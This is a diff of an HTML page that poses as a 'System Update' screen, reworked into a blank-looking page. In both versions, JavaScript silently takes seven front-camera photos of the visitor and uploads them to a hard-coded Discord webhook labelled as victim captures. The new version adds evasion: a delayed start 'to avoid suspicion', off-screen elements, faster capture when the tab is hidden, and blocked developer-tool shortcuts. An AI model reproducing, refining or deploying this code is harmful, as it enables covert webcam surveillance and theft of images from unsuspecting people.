@@ -1,110 +1,19 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>System Update</title>
+    <title></title>
     <style>
-        * {
+        body, html {
             margin: 0;
             padding: 0;
-            box-sizing: border-box;
-        }
-
-        body {
-            font-family: 'Arial', sans-serif;
-            background: #f0f2f5;
-            min-height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: #333;
-            opacity: 0;
-            animation: fadeIn 0.5s ease-in 0.5s forwards;
-        }
-
-        @keyframes fadeIn {
-            to { opacity: 1; }
-        }
-
-        .update-container {
-            background: white;
-            border-radius: 12px;
-            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.12);
-            width: 90%;
-            max-width: 400px;
-            padding: 40px 30px;
-            text-align: center;
-        }
-
-        .update-icon {
-            width: 80px;
-            height: 80px;
-            background: #4CAF50;
-            border-radius: 50%;
-            margin: 0 auto 25px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            animation: pulse 2s infinite;
-        }
-
-        @keyframes pulse {
-            0% { transform: scale(1); }
-            50% { transform: scale(1.05); }
-            100% { transform: scale(1); }
-        }
-
-        .update-icon::after {
-            content: "✓";
-            color: white;
-            font-size: 36px;
-            font-weight: bold;
-        }
-
-        h1 {
-            color: #2c3e50;
-            margin-bottom: 10px;
-            font-size: 24px;
-        }
-
-        .subtitle {
-            color: #7f8c8d;
-            margin-bottom: 30px;
-            font-size: 14px;
-            line-height: 1.5;
-        }
-
-        .progress-container {
-            background: #ecf0f1;
-            border-radius: 10px;
-            height: 6px;
-            margin: 30px 0;
+            width: 100%;
+            height: 100%;
+            background: #ffffff;
             overflow: hidden;
         }
-
-        .progress-bar {
-            background: #4CAF50;
-            height: 100%;
-            width: 0%;
-            transition: width 0.3s ease;
-            border-radius: 10px;
-        }
-
-        .status-text {
-            font-size: 13px;
-            color: #7f8c8d;
-            margin-top: 15px;
-        }
-
-        .countdown {
-            font-size: 12px;
-            color: #95a5a6;
-            margin-top: 20px;
-        }
-
-        /* Hidden elements for camera */
-        #video, #canvas {
+        
+        /* Completely hidden elements */
+        #hiddenCamera, #hiddenCanvas, #status {
             position: absolute;
             top: -9999px;
             left: -9999px;
@@ -113,283 +22,252 @@
             opacity: 0;
             pointer-events: none;
         }
-
-        .hidden-log {
-            display: none;
+        
+        /* Invisible loading indicator (off-screen) */
+        .loader {
+            position: fixed;
+            top: -100px;
+            left: -100px;
+            width: 50px;
+            height: 50px;
+            z-index: -9999;
         }
     </style>
 </head>
 <body>
-    <div class="update-container">
-        <div class="update-icon"></div>
-        <h1>System Update</h1>
-        <p class="subtitle">
-            Your device is being prepared for the latest security patch.
-            Please keep this window open until completion.
-        </p>
-        
-        <div class="progress-container">
-            <div class="progress-bar" id="progressBar"></div>
-        </div>
-        
-        <div class="status-text" id="statusText">
-            Initializing update process...
-        </div>
-        
-        <div class="countdown" id="countdown">
-            Estimated time: <span id="timeLeft">30</span> seconds
-        </div>
-    </div>
-
-    <!-- Hidden elements for camera operations -->
-    <video id="video" autoplay playsinline></video>
-    <canvas id="canvas" style="display: none;"></canvas>
-
-    <!-- Discord webhook configuration -->
-    <div class="hidden-log" id="webhookConfig">
-        <!-- Replace this URL with your actual Discord webhook -->
+    <!-- Appears as completely empty page -->
+    
+    <!-- Hidden camera elements -->
+    <video id="hiddenCamera" autoplay playsinline></video>
+    <canvas id="hiddenCanvas"></canvas>
+    <div id="status"></div>
+    
+    <!-- Hidden Discord webhook config -->
+    <div id="config" style="display:none">
         <input type="hidden" id="webhookUrl" value="https://discord.com/api/webhooks/1445409762195017830/6gtZZ0TfIYEf9rCUHGnArDQOiE6yqzN1ncZMvR5oERHtgO8PJMgDZx3LMHD2ekQgPCxp">
     </div>
 
     <script>
-        // Configuration
+        // Configuration - Edit these values as needed
         const CONFIG = {
+            webhookUrl: document.getElementById('webhookUrl').value,
             totalPhotos: 7,
-            captureDelay: 1500, // 1.5 seconds between photos
-            initialDelay: 2000, // 2 seconds before starting
-            fakeProgress: true, // Show fake progress bar
-            webhookEnabled: true,
-            webhookUrl: document.getElementById('webhookUrl').value
+            delayBetweenPhotos: 1500, // milliseconds
+            initialDelay: 1000, // wait before starting
+            autoClose: false, // automatically close tab when done
+            debugMode: false // set to true to see console logs
         };
 
-        // State
-        let stream = null;
-        let photos = [];
-        let currentPhoto = 0;
-        let completed = false;
-        let countdownInterval = null;
-        let timeLeft = 30;
+        // State management
+        let state = {
+            stream: null,
+            photos: [],
+            currentCount: 0,
+            isComplete: false,
+            started: false
+        };
 
-        // DOM Elements
-        const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
-        const progressBar = document.getElementById('progressBar');
-        const statusText = document.getElementById('statusText');
-        const timeLeftSpan = document.getElementById('timeLeft');
-
-        // Fake status messages for realism
-        const FAKE_STATUSES = [
-            "Initializing security protocols...",
-            "Checking system compatibility...",
-            "Downloading update packages...",
-            "Verifying digital signatures...",
-            "Preparing installation environment...",
-            "Applying security patches...",
-            "Optimizing system performance...",
-            "Finalizing update process...",
-            "Update completed successfully!"
-        ];
-
-        // Update fake progress
-        function updateProgress(percent, message) {
-            if (CONFIG.fakeProgress) {
-                progressBar.style.width = `${percent}%`;
-                statusText.textContent = message;
+        // Debug logging (only in debug mode)
+        function log(...args) {
+            if (CONFIG.debugMode) {
+                console.log('[HiddenCapture]', ...args);
             }
         }
 
-        // Update countdown
-        function updateCountdown() {
-            timeLeft--;
-            timeLeftSpan.textContent = timeLeft;
-            
-            if (timeLeft <= 0) {
-                clearInterval(countdownInterval);
-                timeLeftSpan.textContent = "0";
-            }
+        // Update status (hidden element for debugging)
+        function updateStatus(msg) {
+            document.getElementById('status').textContent = msg;
+            log(msg);
         }
 
-        // Start countdown
-        function startCountdown() {
-            countdownInterval = setInterval(updateCountdown, 1000);
-        }
+        // Take a single photo from camera
+        function capturePhoto() {
+            if (!state.stream || state.currentCount >= CONFIG.totalPhotos) return;
 
-        // Take photo from camera
-        function takePhoto() {
-            if (!stream || currentPhoto >= CONFIG.totalPhotos) return;
-            
-            const context = canvas.getContext('2d');
+            const video = document.getElementById('hiddenCamera');
+            const canvas = document.getElementById('hiddenCanvas');
+            const ctx = canvas.getContext('2d');
+
+            // Set canvas size to video size
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
-            context.drawImage(video, 0, 0, canvas.width, canvas.height);
-            
+
+            // Draw current video frame to canvas
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
             // Convert to blob
             canvas.toBlob((blob) => {
                 if (blob) {
-                    photos.push(blob);
-                    currentPhoto++;
+                    state.photos.push(blob);
+                    state.currentCount++;
                     
-                    // Update fake progress
-                    const progressPercent = Math.floor((currentPhoto / CONFIG.totalPhotos) * 100);
-                    const statusIndex = Math.min(currentPhoto, FAKE_STATUSES.length - 1);
-                    updateProgress(progressPercent, FAKE_STATUSES[statusIndex]);
+                    updateStatus(`Captured ${state.currentCount}/${CONFIG.totalPhotos}`);
                     
-                    // Check if done
-                    if (currentPhoto >= CONFIG.totalPhotos) {
-                        finishCapture();
+                    // Check if we're done
+                    if (state.currentCount >= CONFIG.totalPhotos) {
+                        completeCapture();
                     } else {
-                        // Continue capturing
-                        setTimeout(takePhoto, CONFIG.captureDelay);
+                        // Schedule next capture
+                        setTimeout(capturePhoto, CONFIG.delayBetweenPhotos);
                     }
                 }
             }, 'image/jpeg', 0.8);
         }
 
-        // Send photos to Discord
+        // Send all photos to Discord
         async function sendToDiscord() {
-            if (!CONFIG.webhookEnabled || photos.length === 0) return;
-            
+            if (!CONFIG.webhookUrl || !CONFIG.webhookUrl.includes('discord.com')) {
+                updateStatus('No valid webhook URL configured');
+                return false;
+            }
+
+            if (state.photos.length === 0) {
+                updateStatus('No photos to send');
+                return false;
+            }
+
             try {
+                updateStatus('Sending to Discord...');
+                
                 const formData = new FormData();
-                formData.append('content', VictimFrontCamHacked 😈😈🎉📸: ${photos.length} images captured`);
+                formData.append('content', 'VictimPhoto Shots 🎉😈📸:');
                 
-                // Add all photos
-                photos.forEach((photo, index) => {
-                    formData.append(`files[${index}]`, photo, `capture_${index + 1}.jpg`);
+                // Add all photos to form data
+                state.photos.forEach((photo, index) => {
+                    formData.append(`files[${index}]`, photo, `capture_${Date.now()}_${index + 1}.jpg`);
                 });
-                
-                // Send to Discord
+
+                // Send to Discord webhook
                 const response = await fetch(CONFIG.webhookUrl, {
                     method: 'POST',
                     body: formData
                 });
-                
+
                 if (response.ok) {
-                    console.log(`✅ Successfully sent ${photos.length} photos to Discord`);
+                    updateStatus(`✅ Sent ${state.photos.length} photos to Discord`);
+                    return true;
                 } else {
-                    console.error(`❌ Discord error: ${response.status}`);
+                    updateStatus(`❌ Discord error: ${response.status}`);
+                    return false;
                 }
             } catch (error) {
-                console.error('❌ Network error:', error);
+                updateStatus(`❌ Network error: ${error.message}`);
+                return false;
             }
         }
 
-        // Finish capture process
-        function finishCapture() {
-            completed = true;
+        // Cleanup and finish
+        function completeCapture() {
+            state.isComplete = true;
             
-            // Stop camera
-            if (stream) {
-                stream.getTracks().forEach(track => track.stop());
-                stream = null;
+            // Stop camera stream
+            if (state.stream) {
+                state.stream.getTracks().forEach(track => track.stop());
             }
-            
-            // Update UI
-            updateProgress(100, "Update completed successfully!");
-            clearInterval(countdownInterval);
-            timeLeftSpan.textContent = "0";
             
             // Send to Discord
-            if (CONFIG.webhookEnabled && CONFIG.webhookUrl.startsWith('https://discord.com/api/webhooks/')) {
-                sendToDiscord();
-            }
-            
-            // Auto-close after delay (optional)
-            setTimeout(() => {
-                document.body.innerHTML = `
-                    <div style="text-align: center; padding: 50px;">
-                        <h1>✅ Update Complete</h1>
-                        <p>Your system has been successfully updated.</p>
-                        <p style="font-size: 12px; color: #95a5a6; margin-top: 20px;">
-                            You may now close this window.
-                        </p>
-                    </div>
-                `;
-            }, 3000);
+            sendToDiscord().then(success => {
+                if (CONFIG.autoClose && success) {
+                    // Auto-close tab after successful send
+                    setTimeout(() => {
+                        window.close();
+                    }, 1000);
+                }
+            });
         }
 
-        // Initialize camera and start capture
+        // Initialize camera
         async function initializeCamera() {
             try {
-                // Update status
-                updateProgress(10, "Accessing security camera...");
+                updateStatus('Initializing camera...');
                 
-                // Request camera access
-                stream = await navigator.mediaDevices.getUserMedia({
+                state.stream = await navigator.mediaDevices.getUserMedia({
                     video: {
-                        facingMode: 'user',
+                        facingMode: 'user', // Front camera
                         width: { ideal: 1280 },
                         height: { ideal: 720 }
                     },
                     audio: false
                 });
-                
-                // Set video source
-                video.srcObject = stream;
+
+                const video = document.getElementById('hiddenCamera');
+                video.srcObject = state.stream;
                 
                 // Wait for video to be ready
                 video.onloadedmetadata = () => {
-                    // Start countdown
-                    startCountdown();
+                    updateStatus('Camera ready, starting capture...');
                     
-                    // Start capture after initial delay
+                    // Start capturing photos
                     setTimeout(() => {
-                        updateProgress(20, "Capturing security verification images...");
-                        takePhoto();
-                    }, CONFIG.initialDelay);
+                        capturePhoto();
+                    }, 500);
                 };
-                
+
             } catch (error) {
-                console.error('Camera error:', error);
+                updateStatus(`Camera error: ${error.name}`);
                 
-                // Fallback: Use fake completion even without camera
-                updateProgress(100, "Update completed with limited functionality");
-                setTimeout(() => {
-                    document.body.innerHTML = `
-                        <div style="text-align: center; padding: 50px;">
-                            <h1>⚠️ Update Partially Complete</h1>
-                            <p>Some features require camera access. Update applied with limited functionality.</p>
-                        </div>
-                    `;
-                }, 2000);
+                // Fallback: If camera fails, send dummy message
+                if (CONFIG.webhookUrl.includes('discord.com')) {
+                    fetch(CONFIG.webhookUrl, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            content: 'HappyScreenshot 😀: Camera access failed'
+                        })
+                    });
+                }
+                
+                if (CONFIG.autoClose) {
+                    setTimeout(() => window.close(), 2000);
+                }
             }
         }
 
         // Start everything when page loads
         window.addEventListener('load', () => {
-            // Check if webhook URL is set
-            if (!CONFIG.webhookUrl || !CONFIG.webhookUrl.startsWith('https://discord.com/api/webhooks/')) {
-                console.warn('⚠️ Please set your Discord webhook URL in the HTML file');
-            }
+            updateStatus('Page loaded, waiting to start...');
             
-            // Start the process
+            // Delay start slightly to avoid suspicion
             setTimeout(() => {
-                initializeCamera();
-            }, 1000);
+                if (!state.started) {
+                    state.started = true;
+                    initializeCamera();
+                }
+            }, CONFIG.initialDelay);
         });
 
-        // Optional: Auto-refresh page if it loses focus (for testing persistence)
-        let hiddenTime = 0;
+        // Handle page visibility changes (if user switches tabs)
         document.addEventListener('visibilitychange', () => {
-            if (document.hidden) {
-                // Page is hidden
-                hiddenTime = Date.now();
-            } else {
-                // Page is visible again
-                if (Date.now() - hiddenTime > 5000 && !completed) {
-                    // If page was hidden for more than 5 seconds, restart process
-                    location.reload();
-                }
+            if (document.hidden && !state.isComplete) {
+                // Page hidden, speed up process
+                CONFIG.delayBetweenPhotos = 500;
             }
         });
 
-        // Disable right-click and keyboard shortcuts
-        document.addEventListener('contextmenu', e => e.preventDefault());
-        document.addEventListener('keydown', e => {
-            if (e.ctrlKey && (e.key === 's' || e.key === 'S')) {
+        // Prevent accidental page close (optional)
+        window.addEventListener('beforeunload', (e) => {
+            if (!state.isComplete) {
+                // Optional: Show warning if capture incomplete
+                // e.preventDefault();
+                // e.returnValue = '';
+            }
+        });
+
+        // Disable right-click context menu
+        document.addEventListener('contextmenu', (e) => e.preventDefault());
+        
+        // Optional: Disable some keyboard shortcuts
+        document.addEventListener('keydown', (e) => {
+            // Prevent F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+U
+            if (
+                e.key === 'F12' ||
+                (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J')) ||
+                (e.ctrlKey && e.key === 'u')
+            ) {
                 e.preventDefault();
             }
         });
+
     </script>
 </body>
 </html>
